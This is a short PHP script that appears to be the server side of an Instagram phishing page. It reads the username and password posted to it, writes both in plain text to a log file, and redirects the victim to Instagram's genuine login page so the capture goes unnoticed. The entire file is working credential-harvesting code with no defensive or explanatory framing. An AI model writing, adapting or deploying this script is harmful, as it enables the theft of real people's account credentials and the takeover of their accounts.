<?php
$username = $_POST['username'];
$password = $_POST['password'];

$file = fopen("log.txt", "a");
fwrite($file, "Username: " . $username . " | Password: " . $password . "\n");
fclose($file);

header("Location: https://www.instagram.com/accounts/login/");
exit();
?>
